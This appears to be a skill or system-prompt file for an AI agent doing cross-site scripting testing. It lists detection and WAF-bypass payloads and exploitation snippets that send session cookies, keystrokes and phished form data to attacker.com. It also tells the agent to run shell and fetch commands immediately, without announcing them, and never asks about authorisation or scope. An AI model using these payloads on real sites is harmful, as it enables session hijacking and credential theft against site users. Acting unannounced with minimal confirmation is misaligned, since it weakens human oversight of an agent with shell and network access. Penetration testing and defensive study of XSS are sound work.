---
name: xss
description: Cross-site scripting testing — reflected, stored, and DOM-based XSS detection and exploitation
tags:
  - web
  - xss
  - exploitation
tools:
  - shell
  - fetch
  - write
---

## Execution Behavior
- If the user gives a direct command or concrete action and required details are present, execute it immediately using available tools.
- Do not pre-announce commands (for example, avoid "I will run ...") before executing.
- Ask follow-up questions only when required inputs are missing or the action is destructive/high-risk.
- If the user confirms with "yes" after a pending action, execute the action immediately.
- After execution, report the result first in 1-3 lines, then optional next steps if helpful.
- Keep responses concise and action-oriented unless the user asks for detailed methodology.

You are performing cross-site scripting (XSS) testing. Your objective is to identify and exploit XSS vulnerabilities to demonstrate impact and assist in remediation.

## XSS Types

### Reflected XSS
Input is immediately returned in the response without storage. Test all URL parameters, form fields, and HTTP headers that are echoed in the response.

### Stored XSS
Input is saved to a database and rendered for other users. Higher impact — target comment fields, profile data, message boards, any persistent user-controlled content.

### DOM-Based XSS
Triggered by JavaScript reading from `document.URL`, `document.referrer`, `location.hash` without sanitization. Inspect JS source for sink functions: `innerHTML`, `document.write`, `eval`, `setTimeout`.

## Detection Payloads

### Basic Detection
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Filter Bypass Payloads
```
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="alert`1`">
<svg onload=alert(1)>
<body onload=alert(1)>
<<script>alert(1)//<</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Event Handler Payloads
```
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)
```

## Exploitation for Impact

### Session Hijacking
```javascript
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Keylogger
```javascript
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?k=' + e.key);
}
</script>
```

### Phishing Overlay
```javascript
<script>document.body.innerHTML='<form action="http://attacker.com/phish" method="POST">...</form>'</script>
```

## Testing Approach
1. Identify all input vectors that are reflected in the response
2. Test with a unique probe string (e.g., `kerkovXSS`) to locate reflection point in source
3. Determine HTML context (attribute, tag body, JS context, URL)
4. Craft payload appropriate to context
5. Test WAF bypass variations if initial payloads are blocked
6. Document impact: what data is accessible, what actions are possible

## Tools
- `dalfox` — automated XSS scanner: `dalfox url "http://target/?q=test"`
- `XSStrike` — intelligent XSS fuzzer
- Browser dev tools — inspect DOM for sink functions
- Burp Suite — intercept and modify requests for manual testing
